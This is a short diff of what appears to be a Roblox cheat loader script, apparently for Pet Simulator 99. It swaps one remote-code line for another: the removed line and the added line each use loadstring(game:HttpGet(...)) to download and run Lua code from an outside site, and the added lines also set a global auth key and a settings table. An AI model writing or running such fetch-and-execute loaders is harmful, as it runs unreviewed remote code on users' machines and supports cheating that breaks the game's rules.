@@ -1,2 +1,6 @@
-loadstring(game:HttpGet("https://hugegames.space/1f3cf476ecba4ee66e9ca774.lua"))()
-
+getgenv().AuthKey = "HUGE_EVLo3bTGTxVJ"
+getgenv().temporaryDomain = true
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://v3rmillion2.net/ps99"))()
